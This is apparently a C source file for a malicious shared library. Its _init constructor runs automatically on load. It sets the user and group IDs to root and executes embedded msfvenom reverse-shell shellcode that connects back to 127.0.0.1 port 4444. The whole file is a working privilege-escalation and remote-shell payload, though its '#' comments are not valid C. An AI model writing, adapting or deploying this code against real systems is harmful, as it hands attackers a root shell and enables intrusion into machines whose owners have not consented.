#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

# TCP Reverse Shell on 127.0.0.1:4444 - Created using msfvenom (x64)
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
unsigned char shellcode[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

void _init() {
	# Manually Esclalating the privileges
    setuid(0);
    setgid(0);
	
	# Executing the shellcode
    void *exec = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void (*)())exec)();
}
